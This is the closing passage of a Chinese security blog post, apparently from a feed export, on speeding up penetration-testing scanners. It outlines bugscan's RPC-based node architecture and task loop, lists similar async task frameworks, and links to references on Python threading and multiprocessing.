&lt;/ul&gt;

&lt;p&gt;当然，业内也有小伙伴做出了基于rpc通信的异步任务管理框架，如bugscan。&lt;/p&gt;

&lt;p&gt;其节点有三个核心：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Service: rpc client, 负责与server通信, 获取任务插件，发送报告等操作。
Task_Manager: 任务管理器, 执行添加，删除任务的操作。
Task: 获取插件，执行任务，输出报告。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其运作的大概流程，这里就直接复制别人的分析报告了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;无限循环 -&amp;gt; service 获取任务列表 -&amp;gt; 是否有待执行的任务 -&amp;gt; 发送至 task_manager -&amp;gt; 添加任务 -&amp;gt; 调用 task -&amp;gt; task 执行任务 -&amp;gt; service 设置任务状态 -&amp;gt; 是否返回报告 -&amp;gt; service 发送报告 -&amp;gt; 是否有待停止的任务 -&amp;gt; 发送至 task_manager -&amp;gt; 删除任务 -&amp;gt; 调用 task -&amp;gt; task 停止任务 -&amp;gt; service 设置任务状态 -&amp;gt; 无限循环
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;有兴趣的朋友可以看看原文，这是关于bugscan的一篇详细分析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.chabug.org/tools/553.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;多种其他异步任务框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;相似的框架还是蛮多的，就不一一列举了。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;dramatiq&lt;/li&gt;
  &lt;li&gt;sidekiq&lt;/li&gt;
  &lt;li&gt;huey&lt;/li&gt;
  &lt;li&gt;thriftpy&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;总而言之，只要我们合理利用可以加速的库，可以更好地打造我们的扫描器。本文聊的内容比较基础，接下来的文章里，笔者打算通过细分领域，重点拿经典项目的案例进行剖析。&lt;/p&gt;

&lt;h3 id=&quot;参考文章&quot;&gt;参考文章&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/xiaozi/p/6182990.html&quot;&gt;python线程池（threadpool）模块使用笔记&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhang293/p/7954353.html&quot;&gt;多种方法实现 python 线程池&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://xiaorui.cc/2015/11/03/%E7%90%86%E8%A7%A3python%E7%9A%84multiprocessing-pool-threadpool%E5%A4%9A%E7%BA%BF%E7%A8%8B/&quot;&gt;理解python的multiprocessing.pool threadpool多线程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ns2250225/article/details/48755741&quot;&gt;使用 multiprocessing.dummy 执行多线程任务&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/lxmhhy/p/6052167.html&quot;&gt;python 多进程使用总结&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/PrettyTom/p/6582357.html&quot;&gt;Python的多进程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.chabug.org/tools/553.html&quot;&gt;[X1r0z]模拟bugscan node的通信机制及在线体验
&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</summary></entry></feed>